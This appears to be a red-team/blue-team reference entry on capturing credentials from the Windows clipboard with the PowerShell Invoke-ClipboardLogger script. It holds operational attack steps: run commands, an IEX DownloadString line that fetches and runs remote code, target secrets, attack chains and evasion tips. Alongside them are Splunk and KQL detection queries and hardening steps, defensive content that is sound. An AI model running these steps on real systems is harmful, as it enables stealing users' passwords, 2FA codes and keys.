notes:
=== Clipboard Monitoring - Passive Credential Capture ===
Poll Windows clipboard at intervals to capture copy-pasted credentials, tokens, and sensitive data.

=== WHY CLIPBOARD OVER KEYLOGGER ===
Password managers and admin tools use copy-paste for credentials - keyloggers miss these
2FA/TOTP codes copied from authenticator apps = captured in clipboard
Often faster than waiting for keyboard input - users copy-paste frequently during work

=== TOOL ===
Invoke-ClipboardLogger (PowerShell script):
  Import-Module .\Invoke-ClipboardLogger.ps1
  Invoke-ClipboardLogger

Runs in a loop polling the clipboard on a regular interval
Prints any new content to console (redirect to file for background capture):
  Invoke-ClipboardLogger | Tee-Object -FilePath C:\Temp\clipboard.log

Background execution (PowerShell Job):
  Start-Job { Import-Module C:\Tools\Invoke-ClipboardLogger.ps1; Invoke-ClipboardLogger } | Wait-Job | Receive-Job

=== WHAT GETS CAPTURED ===
Passwords from KeePass/1Password/LastPass (user copy-pastes from vault to browser)
2FA codes from authenticator apps
API keys copied from documentation or portals
Database connection strings copied from admin tools
SSH private keys copied during key management tasks
Internal URLs with embedded tokens

=== OPERATIONAL NOTES ===
Requires persistent session on target while user is actively working
Must run in same session as target user (same desktop context) - not accessible across terminal server sessions
Most valuable during business hours when users are actively logged in
Stop and remove after capturing credentials - avoid leaving monitoring tools on production systems

=== CHAINING CONTEXT ===
Clipboard capture during active user session → KeePass master password → all org credentials
Clipboard capture → VPN token → 2FA bypass → VPN access
Clipboard capture → cloud console session token → AWS/Azure pivot
Combine with process monitoring (process-cmdline-monitor) for comprehensive passive credential capture
name: Interacting with Users - Clipboard Logger
description: Captures clipboard contents over time - users frequently copy/paste passwords, so this often yields plaintext credentials from an active session.

defense.why_it_works: Windows clipboard content is accessible to any process running in the same user session via the Win32 API. A PowerShell script using Invoke-ClipboardLogger polls the clipboard at regular intervals, capturing any text copied by the user - including passwords copied from a password manager, usernames, tokens, or sensitive data.
defense.prerequisites: Shell access in the same user session as the victim. PowerShell execution. Access to or ability to download Invoke-Clipboard.ps1.
defense.impact: Capture of credentials, tokens, or sensitive data copied to clipboard by the user - enabling privilege escalation or lateral movement if admin credentials are copied.
defense.detection: PowerShell downloading and executing Invoke-Clipboard.ps1. Long-running PowerShell process accessing clipboard API at regular intervals. EDR: clipboard access by non-standard process.
defense.artifacts: Process log: PowerShell executing clipboard monitoring script | Network: IEX downloading Invoke-Clipboard.ps1 | EDR: clipboard API access pattern
defense.splunk_spl:
index=wineventlog EventCode=4104 (ScriptBlockText="*Invoke-ClipboardLogger*" OR ScriptBlockText="*Invoke-Clipboard*" OR ScriptBlockText="*DownloadString*Clipboard*")
| table _time, Computer, User, ScriptBlockText
defense.sentinel_kql:
DeviceEvents
| where ActionType == "PowerShellCommand" and ProcessCommandLine has "Clipboard"
| project Timestamp, DeviceName, InitiatingProcessAccountName, ProcessCommandLine
| sort by Timestamp desc
defense.prevention: Enable PowerShell Script Block Logging to detect clipboard monitoring scripts. Deploy EDR detecting clipboard API abuse. Consider using clipboard isolation features in modern Windows (Clipboard History purge, restricted session). Never copy sensitive credentials to clipboard if session may be compromised.
defense.misconfiguration: No PowerShell logging. No EDR detecting clipboard monitoring. User copies admin credentials to clipboard while an attacker has a foothold in the same user session.
defense.vulnerable_config:
# Invoke-Clipboard monitors clipboard content:
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
Invoke-ClipboardLogger
# Captures everything the user copies: passwords, tokens, sensitive data
defense.secure_config:
# Enable PowerShell Script Block Logging
New-Item -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Force
Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1

# Deploy EDR with clipboard monitoring detection
# User guidance: use password manager with auto-fill instead of clipboard copy
defense.evasion: Blend the lure (SCF/LNK/clipboard) into a share users already browse; keep the capture window short; remove the planted file after a hash lands.

response_steps: Correlate alert with source host, user account, and timestamp
Review PowerShell Script Block / Module Logs, Windows Security Event Log for surrounding context (5 min before/after)
Verify whether the activity matches known administrative baselines or change windows
If confirmed malicious, isolate the host and escalate to incident response

explain:
Captures clipboard contents over time to catch copied passwords:
  IEX(New-Object Net.WebClient).DownloadString('...Invoke-Clipboard.ps1')   fetch and load the logger in memory
  Invoke-ClipboardLogger   start recording every clipboard change
Users frequently copy/paste passwords, so an active session often yields plaintext credentials.
